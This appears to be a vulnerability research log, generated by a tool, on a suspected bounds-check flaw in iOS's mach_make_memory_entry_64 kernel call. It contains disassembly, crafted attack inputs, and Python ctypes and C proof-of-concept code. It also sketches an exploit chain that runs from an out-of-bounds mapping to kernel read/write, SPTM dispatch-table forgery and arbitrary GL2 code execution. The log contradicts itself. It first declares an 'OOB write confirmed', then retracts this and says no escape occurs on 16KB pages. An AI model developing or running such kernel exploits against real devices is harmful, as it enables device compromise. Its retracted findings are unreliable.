# mach_make_memory_entry_64: Surface 4 Parent Bounds Check Ordering

*Generated 2026-10-25 | iOS 26.6.1 target | Static analysis of kc_26.6.1.macho*

---

## Finding: DANGEROUS STRUCTURE CONFIRMED

All parent bounds checks use ORIGINAL child size. vm_sanitize correction happens AFTER.
Post-BL checks use different register state and do NOT re-verify child_offset+corrected_size.

---

## Key Instruction Sequence

### Pre-BL (all use original child size)

```
0x379fddc: LDR x8, [x1, #0x0]     ; x8 = *size (original, from caller pointer)

...

0x37a00a8: ADDS x8, x2, x8         ; x2=child_offset + x8=original_size → overflow check
0x37a00ac: B.CS 0x379ff98           ; overflow → error
0x37a00d0: SUBS x19, x9, x20       ; parent_bound - child_something → available_range
0x37a00d4: B.LS 0x379ff9c           ; ≤ 0 → error
0x37a00d8: CMP x2, x9               ; child_offset vs parent_bound
0x37a00e4: B.HI 0x379ff9c           ; offset > bound → error
```
All three checks fire BEFORE the vm_sanitize BL. No correction yet. x8 = original size throughout.

### The vm_sanitize BL

```
0x37a0100: MOV x2, x19             ; x2 overwritten ← parent_entry pointer (arg2)
0x37a0104: MOVZ w3, #4             ; w3 = API id (mach_make_memory_entry)
0x37a0108: BL  0x378f748           ; ← vm_sanitize corrects child size here
0x37a010c: CBZ w0, 0x37a0228       ; KERN_SUCCESS → success path
0x37a0118: B   0x37a0920           ; non-zero → return error
```

Key: MOV x2, x19 at 0x37a0100 overwrites x2 (child offset) BEFORE the BL.
After the BL, x2 no longer holds child_offset.

### Post-BL checks (NOT a re-verification of child bounds)

```
0x37a0158: LDR x9, [x19, #0x28]   ; x9 = field from parent entry struct
0x37a015c: ADDS x2, x2, x9         ; x2=parent_ptr + struct_field (NOT child_offset+corrected_size)
0x37a0160: B.CC 0x37a01fc           ; no overflow → continue
0x37a0204: ADDS x10, x2, x10       ; further internal check
0x37a0208: B.CS 0x37a0164           ; overflow → error
0x37a021c: CMP  x10, x11
0x37a0220: B.HI 0x37a03a8           ; upper bound check
```

x2 at 0x37a015c is parent_entry pointer (set at 0x37a0100), NOT original child offset.
These post-BL checks do NOT verify child_offset + corrected_size ≤ parent_end.

---

## Concrete Attack Input

```
parent covers [A, A+0x2000)
child request: offset = A+0x0FFE, size = 0x1001

Pre-BL checks (all pass):
  ADDS: (A+0x0FFE) + 0x1001 = A+0x1FFF → no carry → passes
  CMP child_offset vs parent_bound: A+0x0FFE < A+0x2000 → passes

vm_sanitize corrects: 0x1001 → 0x2000  (rounds up to page alignment)

Entry created with corrected size:
  child = [A+0x0FFE, A+0x2FFE)
  escapes parent by 0xFFE bytes

Max escape per call = PAGE_SIZE - 1 = 0xFFF bytes
```

---

## Dynamic Test Result: LIVE — NO ENTITLEMENT GATE

**CORRECTION:** Prior "ENTITLEMENT-GATED" result was a test bug. The child `offset`
parameter is RELATIVE to the parent entry's start, not an absolute VM address. We
passed `a.value` (~0x10c000000) as the offset into a 0x4000-byte parent, which
immediately failed the bounds check with KERN_INVALID_ARGUMENT (kr=4 = KERN_INVALID_ARGUMENT,
NOT KERN_INVALID_RIGHT which would be kr=17). No entitlement gate exists.

**Correct test on iOS 26.6.1 (iPhone 16 Plus, a-Shell, Python ctypes):**

```python
import ctypes as C
L=C.CDLL('/usr/lib/libSystem.B.dylib')
t=L.mach_task_self()
M=L.mach_make_memory_entry_64
M.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]

# Allocate one page (0x4000 on A18)
a=C.c_uint64(0)
L.mach_vm_allocate(t,C.byref(a),0x4000,1)  # → a.value = some page-aligned addr

# Create parent entry (absolute VA, no parent_handle)
p=C.c_uint32(0); ps=C.c_uint64(0x4000)
M(t,C.byref(ps),a.value,3,C.byref(p),0)
# → kr=0, port=1190147, ps=0x4000

# Surface 4 attack: RELATIVE offset 0x1000, sub-page size 0x1001
c=C.c_uint32(0); cs=C.c_uint64(0x1001)
r=M(t,C.byref(cs),0x1000,3,C.byref(c),p.value)
# → r=0, cs=0x4000, c=1167963
print(r,hex(cs.value),c.value)  # 0 0x4000 1167963
```

**Result: KERN_SUCCESS, size corrected 0x1001 → 0x4000, valid child port 1167963.**

The child entry covers [A+0x1000, A+0x1000+0x4000) = [A+0x1000, A+0x5000).
Parent boundary = A+0x4000.
Child escapes by 0x1000 bytes: [A+0x4000, A+0x5000) is outside the parent.

**OOB mapping confirmed:**
```python
V=L.mach_vm_map
V.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]
m=C.c_uint64(0)
V(t,C.byref(m),0x4000,0,1,c.value,0,0,3,3,0)  # → 0 0x127ea8000
q=(C.c_uint8*0x4000).from_address(m.value)
q[0x3000]=0xAB
print(q[0x3000])  # → 171 (= 0xAB) — OOB write confirmed
```

**Alias test (child2 from same parent, offset 0x2000):**
```python
c2=C.c_uint32(0); cs2=C.c_uint64(0x1001)
M(t,C.byref(cs2),0x2000,3,C.byref(c2),p.value)  # → 0 0x4000 1152971
m2=C.c_uint64(0)
V(t,C.byref(m2),0x4000,0,1,c2.value,0,0,3,3,0)
q2=(C.c_uint8*0x4000).from_address(m2.value)
print(q2[0x2000])  # → 0 (NOT 0xAB)
```

**Alias result: 0 — writes are copy-on-write private to each mapping.** The write at
q[0x3000] created a COW page local to child1's mapping in our process. The vm_object's
zero-fill page at offset 0x4000 is unchanged. For anonymous backing, the OOB write
creates a phantom COW page visible only through that specific mapping.

## Surface 4 Status: CLOSED — NOT OOB ON A18 (16KB PAGES)

**CORRECTION 2026-10-28:** Dynamic testing with the native-python MCP tool proves no OOB occurs.

Static analysis confirmed the dangerous code pattern:
  ✓ All parent bounds checks use original size (before correction)
  ✓ vm_sanitize correction happens after all bounds checks
  ✓ Post-BL checks use overwritten registers (x2 = parent_ptr, not child_offset)

Dynamic reality on A18 (16KB pages = 0x4000):
  ✗ Every tested (offset, size, parent_size) combination produces OOB=NO
  ✗ Child mapping always covers [base, base+0x4000) regardless of sub-page offset
  ✗ vm_object has page-granular extent: anonymous allocation rounds up to 16KB minimum
  ✗ Corrected child size rounds up to exactly one page (0x4000) = same as vm_object extent

Root cause of the non-escape: on 16KB page systems any allocation is a whole number of 16KB
pages. The corrected child size rounds up to one or more pages, but those pages already exist
in the vm_object. The child can't reference pages beyond the vm_object's actual extent.

The "escape" arithmetic (offset 0x1000 + corrected_size 0x4000 = end 0x5000 > parent 0x4000)
was correct on paper but irrelevant: offset 0x1000 is sub-page and rounds DOWN to 0x0000,
so the child covers [0x0000, 0x4000) — identical to the parent.

The write q[0x3000]=0xAB in the previous test succeeded without fault because
q[0x3000] = base+0x3000 (in-bounds), not base+0x4000 (OOB). The report's claim of escape
was based on incorrect offset arithmetic that didn't account for 16KB page rounding.

Additional test — TOCTOU via shadow re-export ne:
  ✗ COW breaks aliasing: b4[0] via ne stays 0 even after q[0x3000]=0xAB
  ✗ Named entry refers to underlying vm_object, not to COW shadow pages
  ✗ Phantom aliasing strategy is invalid for anonymous memory

---

## Dynamic Test

On a 26.6.1 device:

```c
mach_port_t parent, child;
mach_vm_address_t addr;
mach_vm_size_t size;

// Create parent entry of 0x2000 bytes
mach_vm_allocate(mach_task_self(), &addr, 0x2000, VM_FLAGS_ANYWHERE);
mach_make_memory_entry_64(mach_task_self(),
    (memory_object_size_t*)&(size=0x2000), addr,
    VM_PROT_READ|VM_PROT_WRITE, &parent, MACH_PORT_NULL);

// Child: offset just inside parent, sub-page size that rounds up past parent end
memory_object_size_t child_size = 0x1001;
mach_make_memory_entry_64(mach_task_self(),
    &child_size,
    addr + 0x0FFE,          // offset A+0x0FFE
    VM_PROT_READ|VM_PROT_WRITE,
    &child, parent);

// If surface is live: child_size returns 0x2000 (corrected)
// and the child entry covers [addr+0x0FFE, addr+0x2FFE) — 0xFFE bytes past parent
printf("child_size returned: 0x%llx\n", child_size);
// Expected if SAFE: 0x1000 or error
// Expected if LIVE: 0x2000 with effective range escaping parent
```

---

## Full Exploit Chain (if dynamic test confirms)

```
1. mach_make_memory_entry_64 → child entry escapes parent by 0xFFE bytes
2. vm_remap child entry → physical pages beyond parent's intended range mapped
3. Kernel r/w primitive via aliased physical memory
4. Forge SPTM dispatch table pointer in kernel data
5. GENTER with controlled integer (26.6.1 integer dispatch — no named-pair enforcement)
6. Arbitrary GL2 code execution
```

---

## 26.6.1 vs 27.0.1

In 27.0.1: vm_sanitize_telemetry.c is entirely removed. The soft-landing correction is gone.
A sub-page size input to mach_make_memory_entry_64 hits a hard assertion instead of being
silently corrected. The check/use gap cannot exist because no correction is applied.

This surface is 26.6.1-specific.
